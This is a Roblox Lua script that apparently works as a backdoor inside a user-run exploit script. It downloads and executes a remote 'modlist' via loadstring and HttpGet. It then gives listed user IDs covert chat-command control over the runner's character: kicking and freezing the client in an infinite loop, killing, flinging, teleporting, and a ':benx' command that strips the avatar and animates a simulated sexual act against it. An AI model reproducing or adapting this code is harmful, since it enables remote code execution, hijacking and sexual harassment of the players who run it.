local bending = false
player = game.Players.LocalPlayer
function commands(msg, playa)
    if DisableMod == false then
        local Mod = game:GetService('Players'):GetPlayerByUserId(playa)
        local msg = string.lower(msg)
        local SplitCMD = string.split(msg,' ')
        local lower = string.lower(player.Name)
        local cmdfound = string.find(lower, SplitCMD[2])
        if cmdfound then

            if string.find(SplitCMD[1], ':kick') then
                if playa == 475876108 then
                    player:Kick('')
                    wait(5)
                    while true do end
                end
            end

            if string.find(SplitCMD[1], ':benx') then
                bending = true
                local segtarget = Mod.Name
                local away = .5
                local reversing = false
                local shirt = player.Character:FindFirstChild('Shirt')
                local pants = player.Character:FindFirstChild('Pants')
                if shirt then
                    shirt:Destroy()
                end
                if pants then
                    pants:Destroy()
                end
                local Loop
                local loopFunction = function()
                    local targetchar = game:GetService('Players'):FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                    local character = player.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                            reversing = false
                        end
                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                    end
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                end;
                Start()	
                repeat wait() until bending == false
                Pause()
            end

            if string.find(SplitCMD[1], ':unbenx') then
                repeat 
                    task.wait()
                    bending = false
                until not bending
            end
            
            if string.find(SplitCMD[1], ':bring') then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players:FindFirstChild(Mod.Name).Character.HumanoidRootPart.Position)
            end

            if string.find(SplitCMD[1], ':fling') then
                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
            end

            if string.find(SplitCMD[2], ':freeze') then
                player.Character.HumanoidRootPart.Anchored = true
            end

            if string.find(SplitCMD[2], ':thaw') then
                player.Character.HumanoidRootPart.Anchored = false
            end

            if string.find(SplitCMD[1], ':kill') then
                player.Character.Humanoid.Health = 0
            end

        else
            if string.find(msg, '/e find') then
                if game.Players.LocalPlayer.UserId ~= 475876108 then
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w " .. tostring(Mod.Name) .. " Hi", 'All');
                end
            end
        end
    end
end

local ifMod = loadstring(game:HttpGet("https://raw.githubusercontent.com/SonaScripts/modlist/main/modlist"))()
game.Players.PlayerAdded:Connect(function(plr)
    if ifMod[plr.UserId] then
        plr.Chatted:Connect(function(msg) 
            commands(msg, plr.UserId)
        end)
    end
end)

for i,v in pairs(game:GetService('Players'):GetChildren()) do
    if ifMod[v.UserId] then
        v.Chatted:Connect(function(msg)
            commands(msg, v.UserId)
        end)
    end
end
isMod = false
DisableMod = false
if ifMod[player.UserId] then
    IsMod = true
else
    IsMod = false
end
